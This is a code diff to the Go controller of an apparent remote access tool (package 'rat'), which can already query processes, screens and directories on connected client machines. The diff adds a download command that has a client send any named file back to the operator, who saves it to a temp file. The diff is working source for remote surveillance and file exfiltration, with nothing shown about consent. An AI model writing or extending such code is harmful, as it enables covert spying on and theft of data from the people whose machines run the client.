@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"rat/common"
 	"time"
@@ -16,6 +17,7 @@ const (
 	ProcessQueryEvent   = 1
 	MonitorQueryEvent   = 2
 	DirectoryQueryEvent = 3
+	DownloadQueryEvent  = 4
 )
 
 type Event struct {
@@ -32,6 +34,10 @@ type ScreenEvent struct {
 
 type DirectoryRequestEvent struct {
 	Path string `json:"path"`
+}
+
+type DownloadEvent struct {
+	File string `json:"file"`
 }
 
 func newEvent(event int, clientID int, data string) *Event {
@@ -106,13 +112,27 @@ func incomingWebSocket(ws *websocket.Conn) {
 		} else if event.Event == DirectoryQueryEvent {
 			var directoryEvent DirectoryRequestEvent
 			err := json.Unmarshal([]byte(event.Data), &directoryEvent)
-
 			if err != nil {
 				fmt.Println(err.Error())
+				break
 			}
 
 			client.Listeners[common.DirectoryHeader] = ws
 			client.Queue <- DirectoryPacket{directoryEvent.Path}
+		} else if event.Event == DownloadQueryEvent {
+			var downloadEvent DownloadEvent
+			err := json.Unmarshal([]byte(event.Data), &downloadEvent)
+
+			if err != nil {
+				fmt.Println(err.Error())
+				break
+			}
+
+			file, _ := ioutil.TempFile("", "download")
+
+			client.Listeners[common.GetFileHeader] = ws
+			Transfers[downloadEvent.File] = Transfer{file, downloadEvent.File}
+			client.Queue <- DownloadPacket{downloadEvent.File}
 		}
 	}
 }
